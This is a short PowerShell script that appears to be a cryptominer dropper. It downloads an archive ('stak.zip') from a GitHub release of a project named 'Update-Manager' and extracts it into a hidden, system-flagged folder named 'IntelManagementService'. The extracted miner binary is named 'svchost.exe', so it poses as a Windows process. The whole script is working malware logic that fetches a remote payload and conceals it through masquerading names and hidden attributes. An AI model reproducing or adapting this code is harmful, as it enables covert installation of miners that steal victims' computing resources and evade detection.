$url = "https://github.com/egedmz/Update-Manager/releases/download/1.4.1/stak.zip"
$myLoc = "$env:homedrive\IntelManagementService"

$outMinerData = "$myLoc\data"
$outMinerFile = "$outMinerData\svchost.exe"
$outZip = "$myLoc\stak.zip"
Remove-Item –path $myLoc –recurse -Force
mkdir $myLoc
attrib +h +r +s +a $myLoc /d /s

(New-Object System.Net.WebClient).DownloadFile($url,$outZip)

Expand-Archive $outZip -DestinationPath $myLoc\data -Force
Remove-Item -path $outZip -Force